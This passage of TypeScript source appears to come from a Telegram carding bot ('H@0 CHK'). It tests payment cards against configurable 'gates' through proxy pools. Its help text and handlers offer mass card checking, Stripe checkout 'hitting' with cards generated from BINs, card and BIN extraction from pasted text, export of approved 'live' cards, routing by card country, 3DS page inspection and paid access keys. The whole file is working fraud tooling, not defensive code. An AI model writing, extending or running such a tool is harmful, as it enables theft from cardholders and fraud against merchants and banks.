        // eg_close — wipe context, edit message to a final state
        if (data === "eg_close") {
          editContext.delete(telegramId);
          bot?.answerCallbackQuery(query.id, { text: "Closed" });
          if (chatId && msgId) bot?.editMessageText("🛠 Editor closed.", { chat_id: chatId, message_id: msgId }).catch(() => {});
          return;
        }

        // eg_find — prompt admin for a search term, capture next message
        if (data === "eg_find") {
          if (!ctx) { bot?.answerCallbackQuery(query.id, { text: "Run /editgate first" }); return; }
          ctx.awaitingSearch = { chatId: chatId!, messageId: msgId! };
          ctx.awaiting = undefined;
          editContext.set(telegramId, ctx);
          bot?.answerCallbackQuery(query.id);
          if (chatId && msgId) bot?.editMessageText(
            `🔍 *Find a field*\nSend a search term (e.g. \`nonce\`, \`proxy\`, \`captcha\`, \`bin\`) — matches by field key or label across all categories.`,
            { chat_id: chatId, message_id: msgId, parse_mode: "Markdown", reply_markup: { inline_keyboard: [[{ text: "⬅️ Cancel", callback_data: "eg_back" }]] } }
          ).catch(() => {});
          return;
        }

        // eg_pick_<shortGateId> — choose a gate from the picker
        if (data.startsWith("eg_pick_")) {
          const short = data.replace("eg_pick_", "");
          const gates = await storage.getGateConfigs();
          const gate = gates.find(g => g.id.startsWith(short));
          if (!gate) { bot?.answerCallbackQuery(query.id, { text: "Gate not found" }); return; }
          editContext.set(telegramId, { gateId: gate.id });
          const { text, keyboard } = renderCategoryMenu(gate);
          bot?.answerCallbackQuery(query.id);
          if (chatId && msgId) bot?.editMessageText(text, { chat_id: chatId, message_id: msgId, parse_mode: "Markdown", reply_markup: { inline_keyboard: keyboard } }).catch(() => {});
          return;
        }

        if (!ctx) { bot?.answerCallbackQuery(query.id, { text: "Session expired — run /editgate again" }); return; }

        // eg_back — back to category menu
        if (data === "eg_back") {
          const gate = await storage.getGateConfig(ctx.gateId);
          if (!gate) { bot?.answerCallbackQuery(query.id, { text: "Gate gone" }); return; }
          // Clear BOTH awaiting states — earlier only awaiting was cleared, so
          // tapping Cancel on the Find-Field search prompt left awaitingSearch
          // set and the next plain-text message was captured as a search term.
          ctx.awaiting = undefined;
          ctx.awaitingSearch = undefined;
          const { text, keyboard } = renderCategoryMenu(gate);
          bot?.answerCallbackQuery(query.id);
          if (chatId && msgId) bot?.editMessageText(text, { chat_id: chatId, message_id: msgId, parse_mode: "Markdown", reply_markup: { inline_keyboard: keyboard } }).catch(() => {});
          return;
        }

        // eg_cat_<categoryKey> — open category field list
        if (data.startsWith("eg_cat_")) {
          const category = data.replace("eg_cat_", "");
          const gate = await storage.getGateConfig(ctx.gateId);
          if (!gate) { bot?.answerCallbackQuery(query.id, { text: "Gate gone" }); return; }
          const rendered = renderFieldList(gate, category);
          if (!rendered) { bot?.answerCallbackQuery(query.id, { text: "Bad category" }); return; }
          bot?.answerCallbackQuery(query.id);
          if (chatId && msgId) bot?.editMessageText(rendered.text, { chat_id: chatId, message_id: msgId, parse_mode: "Markdown", reply_markup: { inline_keyboard: rendered.keyboard } }).catch(() => {});
          return;
        }

        // eg_field_<category>_<key> — open per-field editor
        if (data.startsWith("eg_field_")) {
          const rest = data.replace("eg_field_", "");
          const sep = rest.indexOf("_");
          const category = rest.slice(0, sep);
          const fieldKey = rest.slice(sep + 1);
          const field = findField(category, fieldKey);
          if (!field) { bot?.answerCallbackQuery(query.id, { text: "Unknown field" }); return; }
          const gate = await storage.getGateConfig(ctx.gateId);
          if (!gate) { bot?.answerCallbackQuery(query.id, { text: "Gate gone" }); return; }
          const current = getFieldValue(gate, field);

          if (field.type === "bool") {
            // Toggle immediately, no prompt
            const next = !(current === true || current === "true");
            await setFieldValue(ctx.gateId, field, next);
            bot?.answerCallbackQuery(query.id, { text: `${field.label}: ${next ? "ON" : "OFF"}` });
            const refreshed = await storage.getGateConfig(ctx.gateId);
            const rendered = refreshed ? renderFieldList(refreshed, category) : null;
            if (rendered && chatId && msgId) bot?.editMessageText(rendered.text, { chat_id: chatId, message_id: msgId, parse_mode: "Markdown", reply_markup: { inline_keyboard: rendered.keyboard } }).catch(() => {});
            return;
          }
          if (field.type === "select") {
            const keyboard: any[][] = [];
            for (const opt of field.options || []) {
              keyboard.push([{ text: (current === opt ? "● " : "○ ") + opt, callback_data: `eg_setv_${category}_${field.key}_${opt}` }]);
            }
            keyboard.push([{ text: "🗑 Clear value", callback_data: `eg_clear_${category}_${field.key}` }]);
            keyboard.push([{ text: "⬅️ Back", callback_data: `eg_cat_${category}` }]);
            bot?.answerCallbackQuery(query.id);
            const selectHint = field.hint ? `\n_${tgEscape(field.hint)}_` : "";
            if (chatId && msgId) bot?.editMessageText(
              `*${tgEscape(field.label)}* — pick a value${selectHint}\nCurrent: \`${fmtValue(current, field.type)}\``,
              { chat_id: chatId, message_id: msgId, parse_mode: "Markdown", reply_markup: { inline_keyboard: keyboard } }
            ).catch(() => {});
            return;
          }
          // text / number / csv → set awaiting state, prompt
          ctx.awaiting = { category, field: field.key, type: field.type === "number" ? "number" : field.type === "csv" ? "csv" : "text", chatId: chatId!, messageId: msgId! };
          editContext.set(telegramId, ctx);
          const promptHint = field.type === "number" ? "Send a number." :
                             field.type === "csv" ? "Send comma-separated values." :
                             "Send the new text.";
          const currentDisplay = fmtValue(current, field.type);
          const hasCurrent = current !== undefined && current !== null && current !== "";
          const keyboard: any[][] = [];
          // "Keep current" appears only when there *is* a value to keep — tapping
          // it just exits awaiting state without changing anything, saving an
          // admin from having to retype an existing value just to back out.
          if (hasCurrent) keyboard.push([{ text: `↻ Keep "${currentDisplay.slice(0, 24)}"`, callback_data: `eg_keep_${category}_${field.key}` }]);
          keyboard.push([{ text: "🗑 Clear value", callback_data: `eg_clear_${category}_${field.key}` }]);
          keyboard.push([{ text: "⬅️ Back", callback_data: `eg_cat_${category}` }]);
          bot?.answerCallbackQuery(query.id);
          // Compose the prompt body — optional hint above the input line,
          // optional example below it. Both come from the field definition,
          // so the admin gets context-specific guidance instead of generic text.
          const hintLine = field.hint ? `_${tgEscape(field.hint)}_\n\n` : "";
          const exampleLine = field.example ? `\n*Example:* \`${field.example}\`` : "";
          const promptBody =
            `✏️ *Set ${tgEscape(field.label)}*\n` +
            hintLine +
            `*Current:* \`${currentDisplay.replace(/`/g, "'")}\`${exampleLine}\n\n` +
            `${promptHint} (Or tap Keep / Clear / Back.)`;
          if (chatId && msgId) bot?.editMessageText(
            promptBody,
            { chat_id: chatId, message_id: msgId, parse_mode: "Markdown", reply_markup: { inline_keyboard: keyboard } }
          ).catch(() => {});
          return;
        }

        // eg_setv_<category>_<field>_<value> — direct set for selects
        if (data.startsWith("eg_setv_")) {
          const rest = data.replace("eg_setv_", "");
          const parts = rest.split("_");
          if (parts.length < 3) { bot?.answerCallbackQuery(query.id, { text: "Bad callback" }); return; }
          const category = parts[0];
          // Field key cannot contain underscores in select options (they're enum tokens).
          // Find the longest matching field key, then treat the rest as value.
          const grp = FIELD_GROUPS[category];
          if (!grp) { bot?.answerCallbackQuery(query.id, { text: "Bad category" }); return; }
          let field: FieldDef | null = null;
          let valueStr = "";
          for (const f of grp.fields) {
            if (rest.startsWith(`${category}_${f.key}_`)) { field = f; valueStr = rest.slice(`${category}_${f.key}_`.length); break; }
          }
          if (!field) { bot?.answerCallbackQuery(query.id, { text: "Field gone" }); return; }
          // Defensive: only accept values that match the predeclared option list.
          if (field.options && !field.options.includes(valueStr)) {
            bot?.answerCallbackQuery(query.id, { text: "Invalid option" });
            return;
          }
          await setFieldValue(ctx.gateId, field, valueStr);
          bot?.answerCallbackQuery(query.id, { text: `${field.label}: ${valueStr}` });
          const refreshed = await storage.getGateConfig(ctx.gateId);
          const rendered = refreshed ? renderFieldList(refreshed, category) : null;
          if (rendered && chatId && msgId) bot?.editMessageText(rendered.text, { chat_id: chatId, message_id: msgId, parse_mode: "Markdown", reply_markup: { inline_keyboard: rendered.keyboard } }).catch(() => {});
          return;
        }

        // eg_keep_<category>_<field> — exit awaiting state without changing value
        if (data.startsWith("eg_keep_")) {
          const rest = data.replace("eg_keep_", "");
          const sep = rest.indexOf("_");
          const category = rest.slice(0, sep);
          if (ctx) ctx.awaiting = undefined;
          bot?.answerCallbackQuery(query.id, { text: "Kept current value" });
          const refreshed = await storage.getGateConfig(ctx.gateId);
          const rendered = refreshed ? renderFieldList(refreshed, category) : null;
          if (rendered && chatId && msgId) bot?.editMessageText(rendered.text, { chat_id: chatId, message_id: msgId, parse_mode: "Markdown", reply_markup: { inline_keyboard: rendered.keyboard } }).catch(() => {});
          return;
        }

        // eg_clear_<category>_<field> — wipe a value
        if (data.startsWith("eg_clear_")) {
          const rest = data.replace("eg_clear_", "");
          const sep = rest.indexOf("_");
          const category = rest.slice(0, sep);
          const fieldKey = rest.slice(sep + 1);
          const field = findField(category, fieldKey);
          if (!field) { bot?.answerCallbackQuery(query.id, { text: "Unknown field" }); return; }
          if (field.topLevel && REQUIRED_TOP_LEVEL.has(field.key)) {
            bot?.answerCallbackQuery(query.id, { text: `${field.label} is required — can't clear` });
            return;
          }
          try {
            await setFieldValue(ctx.gateId, field, undefined);
          } catch (e: any) {
            bot?.answerCallbackQuery(query.id, { text: e.message?.slice(0, 64) || "Save failed" });
            return;
          }
          ctx.awaiting = undefined;
          bot?.answerCallbackQuery(query.id, { text: "Cleared" });
          const refreshed = await storage.getGateConfig(ctx.gateId);
          const rendered = refreshed ? renderFieldList(refreshed, category) : null;
          if (rendered && chatId && msgId) bot?.editMessageText(rendered.text, { chat_id: chatId, message_id: msgId, parse_mode: "Markdown", reply_markup: { inline_keyboard: rendered.keyboard } }).catch(() => {});
          return;
        }
        return;
        } catch (err: any) {
          // Any uncaught failure inside the eg_* flow — answer the callback so
          // Telegram doesn't show "loading…" forever, and DM the admin a hint.
          console.error("[editgate] callback failed:", err);
          try { bot?.answerCallbackQuery(query.id, { text: "Error — see log" }); } catch {}
          if (chatId) try { bot?.sendMessage(chatId, `❌ Editor error: \`${(err?.message || String(err)).slice(0, 200)}\``, { parse_mode: "Markdown" }); } catch {}
          return;
        }
      }

      // ── Mass-check STOP button ────────────────────────────────────────────
      if (data.startsWith("mass_stop_")) {
        const targetTelegramId = data.replace("mass_stop_", "");
        // Only the admin who started the mass check (or the owner) can stop it
        // — otherwise anyone watching the channel could halt someone else's run.
        const botUser = await storage.getBotUser(telegramId);
        const canStop = telegramId === targetTelegramId || await checkOwner(telegramId, botUser);
        if (!canStop) {
          bot?.answerCallbackQuery(query.id, { text: "Only the runner or owner can stop this." });
          return;
        }
        massStopRequested.add(targetTelegramId);
        bot?.answerCallbackQuery(query.id, { text: "Stopping after current card…" });
        return;
      }

      if (data === "toggle_random_on" || data === "toggle_random_off") {
        const newState = data === "toggle_random_on";
        userRandomGate.set(telegramId, newState);
        bot?.answerCallbackQuery(query.id, { text: newState ? "Random ON" : "Random OFF" });
        if (chatId) {
          bot?.sendMessage(chatId, `🎲 Random gate: *${newState ? "ON" : "OFF"}*`, { parse_mode: "Markdown" });
        }
      }

      if (data.startsWith("clearresults_")) {
        const botUser = await storage.getBotUser(telegramId);
        if (!await checkAdmin(telegramId, botUser)) {
          bot?.answerCallbackQuery(query.id, { text: "Admin only" });
          return;
        }
        const sub = data.replace("clearresults_", "");
        if (sub === "cancel") {
          bot?.answerCallbackQuery(query.id, { text: "Cancelled" });
          if (chatId) bot?.sendMessage(chatId, "❌ Clear cancelled.");
          return;
        }
        try {
          if (sub === "all") {
            await storage.clearAllCheckResults();
            bot?.answerCallbackQuery(query.id, { text: "All results cleared" });
            if (chatId) bot?.sendMessage(chatId, "✅ All check results cleared.");
          } else {
            const days = parseInt(sub, 10);
            const count = await storage.clearResultsOlderThan(days);
            bot?.answerCallbackQuery(query.id, { text: `Cleared ${count} results` });
            if (chatId) bot?.sendMessage(chatId, `✅ Cleared *${count}* results older than *${days}* days.`, { parse_mode: "Markdown" });
          }
        } catch (err: any) {
          bot?.answerCallbackQuery(query.id, { text: "Error clearing results" });
          if (chatId) bot?.sendMessage(chatId, `⚠️ Error: ${err.message?.substring(0, 80)}`);
        }
        return;
      }

      // /clearkeys confirmation flow
      if (data === "clearkeys_confirm" || data === "clearkeys_cancel") {
        const botUser = await storage.getBotUser(telegramId);
        if (!await checkAdmin(telegramId, botUser)) {
          bot?.answerCallbackQuery(query.id, { text: "Admin only" }); return;
        }
        const msgId = query.message?.message_id;
        if (data === "clearkeys_cancel") {
          bot?.answerCallbackQuery(query.id, { text: "Cancelled" });
          if (chatId && msgId) bot?.editMessageText("✖️ Clear cancelled.", { chat_id: chatId, message_id: msgId }).catch(() => {});
          return;
        }
        try {
          const before = (await storage.getAccessKeys()).length;
          await storage.clearAllAccessKeys();
          await storage.createSystemLog({ level: "WARN", message: `Wiped ${before} access keys via Telegram /clearkeys`, source: "telegram" });
          bot?.answerCallbackQuery(query.id, { text: `Cleared ${before} keys` });
          if (chatId && msgId) bot?.editMessageText(`🧹 *Cleared ${before} access keys.*\nUse /genkey to mint new ones.`,
            { chat_id: chatId, message_id: msgId, parse_mode: "Markdown" }).catch(() => {});
        } catch (e: any) {
          bot?.answerCallbackQuery(query.id, { text: "Clear failed — see log" });
        }
        return;
      }

      // /wipegates confirmation flow
      if (data === "wipegates_confirm" || data === "wipegates_cancel") {
        const botUser = await storage.getBotUser(telegramId);
        if (!await checkAdmin(telegramId, botUser)) {
          bot?.answerCallbackQuery(query.id, { text: "Admin only" }); return;
        }
        const msgId = query.message?.message_id;
        if (data === "wipegates_cancel") {
          bot?.answerCallbackQuery(query.id, { text: "Cancelled" });
          if (chatId && msgId) bot?.editMessageText("✖️ Wipe cancelled.", { chat_id: chatId, message_id: msgId }).catch(() => {});
          return;
        }
        try {
          const count = (await storage.getGateConfigs()).length;
          await storage.clearAllGateConfigs();
          await storage.createSystemLog({ level: "WARN", message: `Wiped ${count} gates via Telegram /wipegates`, source: "telegram" });
          bot?.answerCallbackQuery(query.id, { text: `Wiped ${count} gates` });
          if (chatId && msgId) bot?.editMessageText(`🧹 *Wiped ${count} gates.*\nUse /addgate or /importgates to restore.`,
            { chat_id: chatId, message_id: msgId, parse_mode: "Markdown" }).catch(() => {});
        } catch (e: any) {
          bot?.answerCallbackQuery(query.id, { text: "Wipe failed — see log" });
        }
        return;
      }

      if (data.startsWith("reset_")) {
        const botUser = await storage.getBotUser(telegramId);
        if (!await checkAdmin(telegramId, botUser)) {
          bot?.answerCallbackQuery(query.id, { text: "Admin only" });
          return;
        }

        const target = data.replace("reset_", "");
        try {
          if (target === "all") {
            await storage.resetAllData();
          } else if (target === "checks") {
            await storage.clearAllCheckResults();
          } else if (target === "users") {
            await storage.clearAllBotUsers();
          } else if (target === "gates") {
            await storage.clearAllGateConfigs();
          } else if (target === "keys") {
            await storage.clearAllAccessKeys();
          } else if (target === "proxies") {
            await storage.clearAllProxies();
          } else if (target === "logs") {
            await storage.clearAllSystemLogs();
          }
          bot?.answerCallbackQuery(query.id, { text: `Reset ${target} done` });
          if (chatId) {
            bot?.sendMessage(chatId, `✅ *Reset ${target.toUpperCase()} completed.*`, { parse_mode: "Markdown" });
          }
          await storage.createSystemLog({ level: "WARN", message: `Reset "${target}" via Telegram by ${telegramId}`, source: "telegram" });
        } catch (err: any) {
          bot?.answerCallbackQuery(query.id, { text: "Reset failed" });
        }
      }
    });

    bot.onText(/\/randomgate/, async (msg) => {
      const chatId = msg.chat.id;
      const telegramId = msg.from?.id?.toString() || "";

      const botUser = await storage.getBotUser(telegramId);
      if (!await checkAdmin(telegramId, botUser)) {
        bot?.sendMessage(chatId, "🔒 Admin access required. Use /login");
        return;
      }

      const current = userRandomGate.get(telegramId) ?? false;

      const keyboard = [[
        { text: current ? "🔴 Turn OFF" : "🟢 Turn ON", callback_data: current ? "toggle_random_off" : "toggle_random_on" },
      ]];

      const selectedId = userGateSelection.get(telegramId);
      const gates = await storage.getGateConfigs();
      const selectedGate = gates.find(g => g.id === selectedId);

      let text = `🎲 *Random Gate Mode*\n━━━━━━━━━━━━━━━━━━━━\n`;
      text += `*Status:* ${current ? "ON — rotating gates" : "OFF — using fixed gate"}\n`;
      if (!current && selectedGate) text += `*Current Gate:* ${selectedGate.name}\n`;
      text += `\nWhen ON, each check uses a random active gate.`;

      bot?.sendMessage(chatId, text, {
        parse_mode: "Markdown",
        reply_markup: { inline_keyboard: keyboard },
      });
    });

    bot.onText(/^\/autoroute(?:@\w+)?(?:\s+(on|off))?\s*$/i, async (msg, match) => {
      const chatId = msg.chat.id;
      const telegramId = msg.from?.id?.toString() || "";

      const botUser = await storage.getBotUser(telegramId);
      if (!await checkAdmin(telegramId, botUser)) {
        bot?.sendMessage(chatId, "🔒 Admin access required. Use /login");
        return;
      }

      const arg = (match?.[1] || "").toLowerCase();
      const current = userAutoRoute.get(telegramId) ?? false;
      const next = arg === "on" ? true : arg === "off" ? false : !current;
      userAutoRoute.set(telegramId, next);

      // Show how many gates are country-tagged so the operator knows routing can work.
      const gates = (await storage.getGateConfigs()).filter(g => g.active);
      const tagged = gates.filter(g => (g.country || "").trim());
      const byCc = [...new Set(tagged.map(g => (g.country || "").toUpperCase()))].sort();

      let text = `🧭 *Auto-Route Mode*\n━━━━━━━━━━━━━━━━━━━━\n`;
      text += `*Status:* ${next ? "ON — card country → matching gate" : "OFF"}\n`;
      text += `*Country-tagged gates:* ${tagged.length}/${gates.length}${byCc.length ? ` (${byCc.join(", ")})` : ""}\n`;
      if (next && tagged.length === 0) {
        text += `\n⚠️ No gates have a country set yet — routing falls back to your normal gate. Set a gate's country in the dashboard (Configs).`;
      } else {
        text += `\nWhen ON, each card routes to a gate tagged with its BIN country (US card → US gate), falling back to an untagged gate, then your selection.`;
      }
      text += `\n\nUsage: \`/autoroute on\` · \`/autoroute off\``;

      bot?.sendMessage(chatId, text, { parse_mode: "Markdown" });
    });

    bot.onText(/^\/maskcc(?:@\w+)?(?:\s+(on|off))?\s*$/i, async (msg, match) => {
      const chatId = msg.chat.id;
      const telegramId = msg.from?.id?.toString() || "";

      const botUser = await storage.getBotUser(telegramId);
      if (!await checkAdmin(telegramId, botUser)) {
        bot?.sendMessage(chatId, "🔒 Admin access required. Use /login");
        return;
      }

      const arg = (match?.[1] || "").toLowerCase();
      const before = isMaskEnabled();
      const next = arg === "on" ? true : arg === "off" ? false : !before;
      setMaskEnabled(next);

      let text = `🛡 *Sensitive-data mask*\n━━━━━━━━━━━━━━━━━━━━\n`;
      text += `*Status:* ${next ? "ON — PAN body / CVV / ch_ / pi_ are redacted" : "OFF — raw card and Stripe ids shown"}\n`;
      text += `\nMask example: \`411111******1111|12|26|***\` · \`ch_***abcd\` · \`pi_***wxyz\`\n`;
      text += `\nUsage: \`/maskcc on\` · \`/maskcc off\` · \`/maskcc\` (toggle)`;

      bot?.sendMessage(chatId, text, { parse_mode: "Markdown" });
    });

    bot.onText(/\/myinfo/, async (msg) => {
      const chatId = msg.chat.id;
      const telegramId = msg.from?.id?.toString() || "";

      const botUser = await storage.getBotUser(telegramId);
      if (!botUser) {
        bot?.sendMessage(chatId, "❌ Not registered. Send /start first.");
        return;
      }

      const hasAdminAccess = await checkAdmin(telegramId, botUser);
      const hitRate = botUser.totalChecks > 0 ? ((botUser.totalHits / botUser.totalChecks) * 100).toFixed(1) : "0";

      let info =
`👤 *Profile*
━━━━━━━━━━━━━━━━━━━━
*ID:* \`${botUser.telegramId}\`
*User:* ${botUser.username || "N/A"}
*Role:* ${botUser.role.toUpperCase()}${hasAdminAccess ? " 👑" : ""}
*Status:* ${botUser.banned ? "🚫 BANNED" : "✅ ACTIVE"}

📊 *Stats*
*Today:* ${botUser.usageToday}/${botUser.dailyLimit}
*Total:* ${botUser.totalChecks} checks
*Hits:* ${botUser.totalHits} (${hitRate}%)`;

      if (hasAdminAccess) {
        const isRandom = userRandomGate.get(telegramId) ?? false;
        const selectedId = userGateSelection.get(telegramId);
        const gates = await storage.getGateConfigs();
        const selectedGate = gates.find(g => g.id === selectedId);
        info += `\n\n🔧 *Gate*
*Mode:* ${isRandom ? "🎲 Random" : "📌 Fixed"}
*Gate:* ${selectedGate?.name || "Auto (first active)"}`;
      }

      info += `\n━━━━━━━━━━━━━━━━━━━━`;
      bot?.sendMessage(chatId, info, { parse_mode: "Markdown" });
    });

    bot.onText(/\/stats/, async (msg) => {
      const chatId = msg.chat.id;
      const stats = await storage.getCheckStats();
      const proxyStats = await storage.getProxyStats();
      const gates = await storage.getGateConfigs();
      const activeCount = gates.filter(g => g.active).length;
      const hitRate = stats.total > 0 ? ((stats.approved / stats.total) * 100).toFixed(1) : "0";

      const statsMsg =
`📈 *System Stats*
━━━━━━━━━━━━━━━━━━━━
*Checks (24h)*
Total: *${stats.total}*
Approved: *${stats.approved}* ✅
Declined: *${stats.declined}* ❌
Hit Rate: *${hitRate}%*

*Infrastructure*
Gates: *${activeCount}* active / ${gates.length} total
Proxies: *${proxyStats.live}* live / ${proxyStats.total} total
Avg Latency: *${proxyStats.avgLatency}ms*
━━━━━━━━━━━━━━━━━━━━`;

      bot?.sendMessage(chatId, statsMsg, { parse_mode: "Markdown" });
    });

    bot.onText(/\/help/, async (msg) => {
      const chatId = msg.chat.id;
      const telegramId = msg.from?.id?.toString() || "";
      const botUser = await storage.getBotUser(telegramId);
      const hasAdminAccess = await checkAdmin(telegramId, botUser);
      const sysSettings = await storage.getBotSettings();
      const hitterOn = (sysSettings as any).hitterEnabled !== false;
      const genOn    = (sysSettings as any).genEnabled !== false;

      let helpMsg =
`📖 *H@0 CHK V8.0*
━━━━━━━━━━━━━━━━━━━━

*🔍 Checking*
/chk \`CC|MM|YYYY|CVV\` — Single check
/mass — Mass check cards
📎 Upload .txt — Mass check from file
/ccex \`text\` — Extract CCs from any text
/binex \`text\` \`[6|8]\` — Extract unique BINs

_Tip: attach a caption to a .txt upload — \`/ccex\` or \`/binex 8\` — to extract directly from the file instead of mass-checking it._`;

      if (hitterOn) {
        helpMsg += `\n/hit \`URL BIN [count]\` — Hit Stripe checkout with generated cards`;
      }
      if (genOn) {
        helpMsg += `\n/gen \`BIN [count]\` — Generate cards by BIN`;
      }

      helpMsg += `

*🔔 Settings*
/notify — Toggle live CC alerts
/redeem \`KEY\` — Redeem access key
/login \`PASS\` — Admin login

*📊 Info*
/myinfo — Your profile & stats
/stats — System statistics
/version — Build info + feature inventory
/3ds \`url\` — Inspect a 3DS challenge page (admin)`;

      if (hasAdminAccess) {
        helpMsg += `

*👑 Admin — Mining*
/miner — Server miner status
/miner \`start|stop\` — Start/stop miner
/miner \`gate|add|remove|noti|delay\` — Configure
/lives \`[today|24h|week]\` — View approved cards
/livecount — Approval stats by gate
/download — Export approved CCs as file
/clearresults \`[7|30|all]\` — Wipe old results

*👑 Admin — Control*
/autohit \`on URL BIN [delay]\` — Start auto-hitter loop
/autohit \`off\` — Stop auto-hitter
/watch \`GATE_ID\` — Subscribe to gate DM alerts
/watch \`off\` — Clear all gate watches

*👑 Admin — Gates*
/gates — View all gates
/setgate — Select gate
/randomgate — Toggle random mode
/autoroute — Toggle country routing (US card → US gate)
/maskcc — Mask card / charge / intent in responses
/addgate — Add gate (auto-detect / mass / manual)
/editgate \`[name]\` — Interactive editor for all ~40 fields
/deletegate \`<name|id>\` — Remove one gate
/wipegates — Delete ALL gates (with confirmation)
/exportgates — Export all gates as JSON file
/importgates — (send a .json file with this caption to import)

*👑 Admin — Proxies / System*
/proxies — Show proxy pool summary
/addproxy \`<URL>\` — Add proxy (single or multi-line list)
/proxy\\_clear — Drop dead proxies
/clearsessions — Clear cached gate sessions (force re-scrape)
/classmode \`[strict|lenient]\` — Toggle classifier strictness
/logs \`[n]\` — Last N system log entries

*👑 Admin — Users / Keys*
/genkey \`[days] [dailyLimit]\` — Generate access key (defaults 30d, 1000/day)
/keys — List all access keys with status
/revokekey \`<key|prefix>\` — Delete one access key
/clearkeys — Delete ALL access keys (with confirmation)
/ban \`user\\_id\` — Ban user
/unban \`user\\_id\` — Unban user
/broadcast \`msg\` — Message all
/export — Export results CSV
/reset — Reset system data
/admins — List admins (any admin can view)
/addadmin \`id\` — Promote to admin (owner-only)
/removeadmin \`id\` — Demote (owner-only)
/features \`[key on|off]\` — Toggle bot features (owner-only)
/setmasslimit \`[admin|user N]\` — Set mass-check batch cap (owner-only)
/massworkers \`[N]\` — Get/set parallel workers for /mass (1–8)
/massdedup \`[on|off|clear|N]\` — Velocity/dedup guard for /mass

*🤖 Admin — AI*
/setaikey \`KEY\` — Save NVIDIA API key (or \`clear\` to remove)
/ai \`question\` — Ask the AI assistant (multi-turn, /ai reset to clear)
/aiconfig \`[name]\` — Auto-configure a gate from its URL (re-detect → analyze → preview → apply)`;
      }

      helpMsg += `\n━━━━━━━━━━━━━━━━━━━━\n🔑 Requires redeemed key (or admin)`;
      bot?.sendMessage(chatId, helpMsg, { parse_mode: "Markdown" });
    });

    // ── /ccex /binex — extract cards / BINs from pasted text ──────────────────
    //   Works on any text reply (DM, group, forwarded message) — pulls valid
    //   PANs via Luhn, sniffs nearby expiry + CVV, dedupes.
    bot.onText(/\/ccex(?:\s+([\s\S]+))?/, async (msg, match) => {
      const chatId = msg.chat.id;
      const telegramId = msg.from?.id?.toString() || "";
      if (!isFeatureEnabled("ccex")) { bot?.sendMessage(chatId, "🚫 /ccex is currently disabled by the owner."); return; }
      const botUser = await storage.getBotUser(telegramId);
      if (!botUser) { bot?.sendMessage(chatId, "❌ Not registered. /start first."); return; }
      // Use either the inline arg OR the replied-to message's body — admins
      // commonly forward a chunk of text and reply with just "/ccex".
      const replyText = (msg.reply_to_message as any)?.text || "";
      const text = (match?.[1] || "").trim() || replyText;
      if (!text) {
        bot?.sendMessage(chatId,
`💳 *CC Extractor*
━━━━━━━━━━━━━━━━━━━━
\`/ccex <text>\` — extract PAN|MM|YY|CVV from any text
Or reply to a message containing card data with \`/ccex\`

Output: deduplicated, Luhn-validated cards. Bare BINs come back when expiry/CVV isn't nearby.`,
          { parse_mode: "Markdown" });
        return;
      }
      const cards = extractCards(text);
      if (cards.length === 0) {
        bot?.sendMessage(chatId, "⚠️ No valid cards found.");
        return;
      }
      const sum = summarizeExtraction(cards);
      const display = cards.slice(0, 50).join("\n");
      const head = `💳 *${cards.length}* card(s) extracted\n*Full:* ${sum.withCvv} · *No CVV:* ${sum.withExpiryOnly} · *Bare PAN:* ${sum.bareBins}\n━━━━━━━━━━━━━━━━━━━━\n\`\`\`\n${display}${cards.length > 50 ? `\n... +${cards.length - 50} more` : ""}\n\`\`\``;
      bot?.sendMessage(chatId, head.slice(0, 4000), { parse_mode: "Markdown" });
    });

    bot.onText(/\/binex(?:\s+([\s\S]+))?/, async (msg, match) => {
      const chatId = msg.chat.id;
      const telegramId = msg.from?.id?.toString() || "";
      if (!isFeatureEnabled("binex")) { bot?.sendMessage(chatId, "🚫 /binex is currently disabled by the owner."); return; }
      const botUser = await storage.getBotUser(telegramId);
      if (!botUser) { bot?.sendMessage(chatId, "❌ Not registered. /start first."); return; }
      const replyText = (msg.reply_to_message as any)?.text || "";
      const args = (match?.[1] || "").trim().split(/\s+/);
      const lengthArg = args.find(a => a === "6" || a === "8");
      const text = args.filter(a => a !== "6" && a !== "8").join(" ").trim() || replyText;
      const binLen: 6 | 8 = lengthArg === "8" ? 8 : 6;
      if (!text) {
        bot?.sendMessage(chatId,
`🏦 *BIN Extractor*
━━━━━━━━━━━━━━━━━━━━
\`/binex <text> [6|8]\` — pull unique BINs
Default length 6 digits; pass \`8\` for 8-digit BINs (modern Visa/MC).
Or reply to a message with \`/binex\`.`,
          { parse_mode: "Markdown" });
        return;
      }
      const bins = extractBins(text, binLen);
      if (bins.length === 0) {
        bot?.sendMessage(chatId, "⚠️ No valid BINs found.");
        return;
      }
      const display = bins.slice(0, 100).join("\n");
      bot?.sendMessage(chatId,
`🏦 *${bins.length}* unique ${binLen}-digit BIN(s)
━━━━━━━━━━━━━━━━━━━━
\`\`\`
${display}${bins.length > 100 ? `\n... +${bins.length - 100} more` : ""}
\`\`\``,
        { parse_mode: "Markdown" });
    });

    // ── /3ds <url> — inspect a 3DS challenge page (issuer / merchant / type) ───
    //   /3ds <url> headless    — drive via puppeteer if installed
    bot.onText(/\/3ds(?:\s+(.+))?/, async (msg, match) => {
      const chatId = msg.chat.id;
      const telegramId = msg.from?.id?.toString() || "";
      if (!isFeatureEnabled("threeds_inspect")) { bot?.sendMessage(chatId, "🚫 /3ds is disabled."); return; }
      const botUser = await storage.getBotUser(telegramId);
      if (!await checkAdmin(telegramId, botUser)) {
        bot?.sendMessage(chatId, "🔒 Admin only.");
        return;
      }
      const args = (match?.[1] || "").trim().split(/\s+/);
      const url = args[0];
      const useHeadless = args.includes("headless");
      if (!url || !/^https?:\/\//i.test(url)) {
        bot?.sendMessage(chatId,
`🔍 *3DS Inspector*
━━━━━━━━━━━━━━━━━━━━
\`/3ds <challenge_url>\` — inspect via HTML fetch
\`/3ds <url> headless\` — drive via puppeteer (if installed)

Reads the bank's challenge page and surfaces:
• Issuing bank name
• Merchant descriptor
• Auth amount as bank shows it
• Challenge type (SMS OTP, biometric, app push, …)
• In-page bank errors`,
          { parse_mode: "Markdown" });
        return;
      }
      const thinking = await bot?.sendMessage(chatId, "🔍 _inspecting…_", { parse_mode: "Markdown" });
      try {
        const insp = useHeadless ? await headlessDrive(url) : await inspectThreeDsChallenge(url);
        const out = `🔍 *3DS Inspection*\n━━━━━━━━━━━━━━━━━━━━\n${formatInspection(insp)}\n━━━━━━━━━━━━━━━━━━━━\n[challenge page](${url})`;
        if (thinking) await bot?.editMessageText(out, { chat_id: chatId, message_id: thinking.message_id, parse_mode: "Markdown" }).catch(() => {
          bot?.sendMessage(chatId, out, { parse_mode: "Markdown" });
        });
      } catch (e: any) {
        const err = `❌ Inspection failed: ${e.message || String(e)}`;
